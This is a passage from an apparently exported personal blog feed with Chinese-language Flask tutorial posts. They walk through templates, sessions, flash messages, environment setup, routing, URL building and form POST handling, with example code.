class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">        &#123;% block page_content %&#125;&#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line">&#123;% import "bootstrap/wtf.html" as wtf %&#125;</span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello,&#123;% if name %&#125;&#123;&#123; name &#125;&#125;&#123;% else %&#125;Stranger&#123;% endif %&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;&#123; wtf.quick_form(form) &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/04/24/Flask%E6%95%99%E7%A8%8B%E4%BA%8C/E:%5Cblog%5Chexo%5Csource_posts%5CFlask%E6%95%99%E7%A8%8B%E4%BA%8C.assets%5Cimage-20200428170326312.png"  alt="image-20200428170326312"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/04/24/Flask%E6%95%99%E7%A8%8B%E4%BA%8C/E:%5Cblog%5Chexo%5Csource_posts%5CFlask%E6%95%99%E7%A8%8B%E4%BA%8C.assets%5Cimage-20200428170357498.png"  alt="image-20200428170357498"></p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/04/24/Flask%E6%95%99%E7%A8%8B%E4%BA%8C/E:%5Cblog%5Chexo%5Csource_posts%5CFlask%E6%95%99%E7%A8%8B%E4%BA%8C.assets%5Cimage-20200428170414647.png"  alt="image-20200428170414647"></p>
<h2 id="4-5-重定向和用户会话"><a href="#4-5-重定向和用户会话" class="headerlink" title="4.5 重定向和用户会话"></a>4.5 重定向和用户会话</h2><p>修改app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template,session,redirect,url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'hard to guess string'</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义表单类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span>  <span class="comment"># 含有文本字段name和提交按钮submit</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        session[<span class="string">'name'</span>]=form.name.data</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form, name=session.get(<span class="string">'name'</span>))</span><br></pre></td></tr></table></figure>

<h2 id="4-6-闪现消息"><a href="#4-6-闪现消息" class="headerlink" title="4.6 闪现消息"></a>4.6 闪现消息</h2><p>app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template,session,redirect,url_for,flash</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'hard to guess string'</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义表单类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NameForm</span><span class="params">(FlaskForm)</span>:</span>  <span class="comment"># 含有文本字段name和提交按钮submit</span></span><br><span class="line">    name = StringField(<span class="string">'What is your name?'</span>, validators=[DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    form = NameForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        old_name=session.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">if</span> old_name <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> old_name!=form.name.data:</span><br><span class="line">            flash(<span class="string">'looks like you have changed your name!'</span>)</span><br><span class="line">        session[<span class="string">'name'</span>]=form.name.data</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,form=form,name=session.get(<span class="string">'name'</span>))</span><br></pre></td></tr></table></figure>

<p>base.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "bootstrap/base.html" %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line">&#123;% block navbar %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar navbar-inverse"</span> <span class="attr">role</span>=<span class="string">"navigation"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle"</span></span></span><br><span class="line"><span class="tag">            <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">".navbar-collapse"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Flasky<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-collapse collapse"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    &#123;% for message in get_flashed_messages() %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"aler alert-warning"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"alert"</span>&gt;</span><span class="symbol">&amp;times;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        &#123;&#123; message &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endfor %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">        &#123;% block page_content %&#125;&#123;% endblock %&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% extends "base.html" %&#125;</span><br><span class="line">&#123;% import "bootstrap/wtf.html" as wtf %&#125;</span><br><span class="line">&#123;% block title %&#125;Flasky&#123;% endblock %&#125;</span><br><span class="line">&#123;% block page_content %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello,&#123;% if name %&#125;&#123;&#123; name &#125;&#125;&#123;% else %&#125;Stranger&#123;% endif %&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;&#123; wtf.quick_form(form) &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>





<div class="note info">
            <p>部分内容借鉴：</p><ul><li>中国工信出版社集团 人民邮电出版社《Flask Web开发第二版》</li><li></li></ul>
          </div>]]></content>
      <categories>
        <category>Flask</category>
      </categories>
      <tags>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask学习教程一——基础</title>
    <url>/2020/04/22/Flask%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><blockquote>
<p>本文主要参考<a href="https://www.w3cschool.cn/flask/Flask-3ask1yho.html" target="_blank" rel="noopener">https://www.w3cschool.cn/flask/Flask-3ask1yho.html</a><br>本文大致按照参考资料架构书写，对代码错误或版本不兼容进行了修正<br>如果需要更严谨的教程请参考<a href="https://dormousehole.readthedocs.io/en/latest/" target="_blank" rel="noopener">官方文档</a></p>
</blockquote>
<ul>
<li>本文由于python2和python3共存，且使用python3环境运行，用pip3代替pip</li>
<li>windows10</li>
<li>Pycharm专业版和Jupyter Notebook</li>
<li>Python 3.7.2<br>Flask 1.1.1<br>Werkzeug 0.16.0</li>
<li>要求有python和html基础</li>
</ul>
<h2 id="Flask-概述"><a href="#Flask-概述" class="headerlink" title="Flask 概述"></a>Flask 概述</h2><h3 id="什么是Web-Framework？"><a href="#什么是Web-Framework？" class="headerlink" title="什么是Web Framework？"></a>什么是Web Framework？</h3><p>Web Application Framework（Web应用程序框架）或简单的Web Framework（Web框架）表示一个库和模块的集合，使Web应用程序开发人员能够编写应用程序，而不必担心协议，线程管理等低级细节。</p>
<h3 id="什么是Flask？"><a href="#什么是Flask？" class="headerlink" title="什么是Flask？"></a>什么是Flask？</h3><p>Flask是一个用Python编写的Web应用程序框架。 它由 <strong>Armin Ronacher</strong> 开发，他领导一个名为Pocco的国际Python爱好者团队。 Flask基于Werkzeug WSGI工具包和Jinja2模板引擎。两者都是Pocco项目。</p>
<h3 id="WSGI"><a href="#WSGI" class="headerlink" title="WSGI"></a>WSGI</h3><p>Web Server Gateway Interface（Web服务器网关接口，WSGI）已被用作Python Web应用程序开发的标准。WSGI是Web服务器和Web应用程序之间通用接口的规范。</p>
<h3 id="Werkzeug"><a href="#Werkzeug" class="headerlink" title="Werkzeug"></a>Werkzeug</h3><p>它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。</p>
<h3 id="jinja2"><a href="#jinja2" class="headerlink" title="jinja2"></a>jinja2</h3><p>jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p>
<p>Flask通常被称为微框架。 它旨在保持应用程序的核心简单且可扩展。Flask没有用于数据库处理的内置抽象层，也没有形成验证支持。相反，Flask支持扩展以向应用程序添加此类功能。一些受欢迎的Flask扩展将在本教程后续章节进行讨论。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="virtualenv"><a href="#virtualenv" class="headerlink" title="virtualenv"></a>virtualenv</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install virutalenv</span><br><span class="line">mkdir newproj</span><br><span class="line">cd newproj</span><br><span class="line">virtualenv venv</span><br><span class="line">venv\scripts\activate</span><br></pre></td></tr></table></figure>

<p>或者在新建项目时在“环境中”选择<code>virtualenv</code></p>
<h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install Flask</span><br></pre></td></tr></table></figure>

<ul>
<li><p>注：pycharm专业版对flask有特殊支持，博主使用的是学生账号</p>
<p><img src="/img/loading.gif" class="lazyload" data-src="/images/Flask%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B.assets/6375263-8711d7ef517770d0.webp"  alt="img"></p>
</li>
</ul>
<h2 id="Flask应用"><a href="#Flask应用" class="headerlink" title="Flask应用"></a>Flask应用</h2><h3 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Hello World'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run()</span><br></pre></td></tr></table></figure>

<ul>
<li>运行：<br>注意不要使用idle<br><img src="/img/loading.gif" class="lazyload" data-src="/images/Flask%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B.assets/image-20200422152732766.png"  alt="Hello world"></li>
<li>打开<a href="http://127.0.0.1:5000/" target="_blank" rel="noopener">http://127.0.0.1:5000/</a> 或 localhost:5000<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200422152822853.png"  alt="image-20200422152822853" style="zoom: 50%;"></li>
</ul>
<h3 id="函数解释"><a href="#函数解释" class="headerlink" title="函数解释"></a>函数解释</h3><h4 id="app-Flask-name"><a href="#app-Flask-name" class="headerlink" title="app = Flask(_name_)"></a>app = Flask(_<em>name_</em>)</h4><p>Flask构造函数使用<strong>当前模块（__name __）</strong>的名称作为参数。</p>
<h4 id="app-run"><a href="#app-run" class="headerlink" title="app.run()"></a>app.run()</h4><p>Flask类的<strong>run()</strong>方法在本地开发服务器上运行应用程序。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.run(host, port, debug, options)</span><br></pre></td></tr></table></figure>

<p>所有参数都是可选的</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>参数与描述</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><strong>host</strong> 要监听的主机名。 默认为127.0.0.1（localhost）。设置为“0.0.0.0”以使服务器在外部可用</td>
</tr>
<tr>
<td>2</td>
<td><strong>port</strong> 默认值为5000</td>
</tr>
<tr>
<td>3</td>
<td><strong>debug</strong> 默认为false。 如果设置为true，则提供调试信息</td>
</tr>
<tr>
<td>4</td>
<td><strong>options</strong> 要转发到底层的Werkzeug服务器。</td>
</tr>
</tbody></table>
<h3 id="调试模式"><a href="#调试模式" class="headerlink" title="调试模式"></a>调试模式</h3><p>通过调用run()方法启动Flask应用程序。但是，当应用程序正在开发中时，应该为代码中的每个更改手动重新启动它。为避免这种不便，请启用调试支持。如果代码更改，服务器将自行重新加载。它还将提供一个有用的调试器来跟踪应用程序中的错误（如果有的话）。</p>
<p>在运行或将调试参数传递给run()方法之前，通过将application对象的debug属性设置为True来启用Debug模式。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>



<h2 id="Flask路由"><a href="#Flask路由" class="headerlink" title="Flask路由"></a>Flask路由</h2><p>Flask中的route()装饰器用于将URL绑定到函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.route(rule, options)</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>rule</strong> 参数表示与该函数的URL绑定。</li>
<li><strong>options</strong> 是要转发给基础Rule对象的参数列表。<h3 id="app-route-‘-‘"><a href="#app-route-‘-‘" class="headerlink" title="@app.route(‘/‘)"></a>@app.route(‘/‘)</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'hello world'</span></span><br></pre></td></tr></table></figure>
在上面的示例中，’/ ‘ URL与<strong>hello_world()</strong>函数绑定。因此，当在浏览器中打开web服务器的主页时，将呈现该函数的输出。</li>
</ul>
<h3 id="app-route-‘-hello’"><a href="#app-route-‘-hello’" class="headerlink" title="@app.route(‘/hello’)"></a>@app.route(‘/hello’)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.route(&#39;&#x2F;hello&#39;)</span><br><span class="line">def hello_world():</span><br><span class="line">   return &#39;hello world&#39;</span><br></pre></td></tr></table></figure>

<p>访问<strong>http：// localhost:5000/hello</strong> URL，<strong>hello_world()</strong>函数的输出将在浏览器中呈现。<br>此时localhost:5000将返回404</p>
<h3 id="Flask变量规则"><a href="#Flask变量规则" class="headerlink" title="Flask变量规则"></a>Flask变量规则</h3><p>构建动态URL，变量部分标记为<strong>&lt;variable-name&gt;</strong>。它作为关键字参数传递给与规则相关联的函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>如果</p>
<table>
<thead>
<tr>
<th>序号</th>
<th>转换器和描述</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>接受字符串 %s</td>
</tr>
<tr>
<td>1</td>
<td><strong>int</strong>接受整数 %d</td>
</tr>
<tr>
<td>2</td>
<td><strong>float</strong>对于浮点值 %f</td>
</tr>
<tr>
<td>3</td>
<td>*<em>path *</em>接受用作目录分隔符的斜杠</td>
</tr>
</tbody></table>
<p>在下面的代码中，使用了所有这些构造函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_name</span><span class="params">(name)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Hello %s!'</span> % name</span><br><span class="line"><span class="comment"># 或者写为 return '&lt;h1&gt;hello &#123;&#125;&lt;/h1&gt;'.format(name)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/blog/&lt;int:postID&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_blog</span><span class="params">(postID)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Blog Number %d'</span> % postID</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/rev/&lt;float:revNo&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">revision</span><span class="params">(revNo)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Revision Number %f'</span> % revNo</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run()</span><br></pre></td></tr></table></figure>

<p>在浏览器中输入<strong><a href="http://localhost:5000/hello/w3cschool" target="_blank" rel="noopener">http://localhost:5000/hello/w3cschool</a></strong>作为<strong>URL</strong> , 则<strong>‘w3cschool’</strong>将作为参数提供给<strong>hello()</strong>函数。该页面讲显示<code>Hello w3cschool!</code></p>
<p>访问浏览器中的URL <strong><a href="http://localhost:5000/blog/11" target="_blank" rel="noopener">http://localhost:5000/blog/11</a></strong> 。给定的数字用作<strong>show_blog()</strong>函数的参数。浏览器显示以下输出：</p>
<blockquote>
<p>Blog Number 11</p>
</blockquote>
<p>在浏览器中输入此URL - <strong><a href="http://localhost:5000/rev/1.1" target="_blank" rel="noopener">http://localhost:5000/rev/1.1</a></strong></p>
<p><strong>revision()</strong>函数将浮点数作为参数。以下结果显示在浏览器窗口中：</p>
<blockquote>
<p>Revision Number 1.100000</p>
</blockquote>
<h3 id="定义规则"><a href="#定义规则" class="headerlink" title="定义规则"></a>定义规则</h3><p>Flask的URL规则基于Werkzeug的路由模块。这确保形成的URL是唯一的，并且基于Apache规定的先例。</p>
<p>考虑以下脚本中定义的规则：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/flask')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_flask</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Hello Flask'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/python/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_python</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Hello Python'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run()</span><br></pre></td></tr></table></figure>

<p>这两个规则看起来类似，但在第二个规则中，使用斜杠<strong>（/）</strong>。因此，它成为一个规范的URL。因此，使用<strong>/python</strong> 或 <strong>/python/</strong>返回相同的输出。但是，如果是第一个规则，/flask/ URL会产生“404 Not Found”页面。</p>
<h3 id="Flask-URL构建"><a href="#Flask-URL构建" class="headerlink" title="Flask URL构建"></a>Flask URL构建</h3><p>url_for()用于动态构建特定函数url</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/admin')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_admin</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Hello Admin'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/guest/&lt;guest&gt;')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_guest</span><span class="params">(guest)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'Hello %s as Guest'</span> % guest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/user/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_user</span><span class="params">(name)</span>:</span></span><br><span class="line">   <span class="keyword">if</span> name ==<span class="string">'admin'</span>:</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'hello_admin'</span>))</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'hello_guest'</span>,guest = name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>如果访问<code>/user/admin</code>将调用<code>hello_admin</code>并跳转至<code>/admin</code>，如果访问的是<code>/user/abc</code>将调用<code>hello_guest</code>并跳转至<code>/guest/abc</code></p>
<h2 id="Flask-HTTP方法"><a href="#Flask-HTTP方法" class="headerlink" title="Flask HTTP方法"></a>Flask HTTP方法</h2><table>
<thead>
<tr>
<th>http方法</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>GET</td>
<td>以未加密的形式将数据发送到服务器。最常见的方法。</td>
</tr>
<tr>
<td>POST</td>
<td>用于将HTML表单数据发送到服务器。POST方法接收的数据不由服务器缓存。</td>
</tr>
</tbody></table>
<p>默认情况下，Flask路由响应<strong>GET</strong>请求，下面演示如何使用<strong>POST</strong>方法</p>
<p>login.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"http://localhost:5000/login"</span> <span class="attr">method</span> = <span class="string">"post"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span>Enter Name:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"nm"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">value</span> = <span class="string">"submit"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

